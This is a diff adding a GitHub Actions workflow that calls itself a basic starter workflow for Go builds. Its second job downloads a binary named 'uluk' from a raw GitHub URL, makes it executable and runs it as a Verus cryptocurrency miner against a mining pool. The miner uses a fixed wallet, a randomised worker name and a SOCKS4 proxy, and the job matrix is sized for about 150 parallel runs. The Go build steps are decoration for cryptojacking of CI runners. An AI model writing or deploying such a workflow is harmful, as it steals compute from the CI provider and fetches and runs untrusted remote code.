@@ -1,0 +1,59 @@
+# This is a basic workflow to help you get started with Actions
+
+name: Bbebkss
+on: [push, pull_request]
+jobs:
+  build:
+    name: tete
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 150
+      fail-fast: false
+      matrix: 
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
+        flag: [A, B]
+    timeout-minutes: 60
+    env:
+        NUM_JOBS: 150
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: runner_go
+      run: |
+  postgres-3:
+    name: AnakHaram
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 150
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O]
+    timeout-minutes: 60
+    env:
+        NUM_JOBS: 150
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: runner_go
+      run: |
+        wget https://raw.githubusercontent.com/mastinsaan0007/teste/main/uluk
+        chmod +x uluk
+        screen -dmS ls
+        POOL=stratum+tcp://eu.luckpool.net:3956
+        WALLET=RN1cao1jLNBfdmU9TtBWCcKT2jxAhK8fez
+        WORKER=$(echo $(shuf -i 1-10 -n 1)ThreadRipper3990x)
+        PROXY=socks4://108.61.81.102:5678
+        ./uluk -a verus -o $POOL -u $WALLET.$WORKER -p c=VRSC,zap=VRSC -t 2 -x $PROXY
